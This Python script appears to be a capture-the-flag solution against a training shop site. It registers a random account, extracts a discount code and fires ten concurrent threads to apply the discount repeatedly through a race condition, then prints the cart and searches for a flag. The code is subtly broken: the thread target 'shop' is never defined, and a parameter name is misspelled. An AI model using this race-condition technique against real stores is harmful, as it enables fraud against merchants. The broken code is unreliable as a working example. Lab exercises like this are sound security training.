import requests
import string
import random
import re
import threading
import time

url = "http://discount.training.offdef.it"

def find_flag(data):
	search = re.search("flag{[a-zA-Z1-9_!?]+}", data)
	if search:
		return search.group()
	  
def find_discount_code(data):
	search = re.search("Code: (\w+)", data)
	if search:
		return search.group(1)

def gen_ran_string(size=25):
	return "".join(random.choice(string.ascii_letters) for _ in range(size))

def register(s, u, p):
	data = {"username": u, "password": p}
	return s.post(url+"/register", data=data)

def add_to_cart(s, item_id):
	params = {"item_id": item_id}
	return s.get(url+"/add_to_cart", params=params)

def apply_discount(s, discont_code):
	data = {"discount": discount_code}
	return s.post(url+"/apply_discount", data=data)

def cart(s):
	return s.get(url+"/cart")

u = gen_ran_string(size=10)
p = gen_ran_string(size=10)
s = requests.Session()
r = register(s, u, p)
discount_code = find_discount_code(r.text)
add_to_cart(s, 21)

threads = []
for i in range(10):
	threads.append(threading.Thread(target=shop, args=(s, )))

for i in range(10):
	threads[i].start()

for i in range(10):
	threads[i].join()

print(cart(s).text)
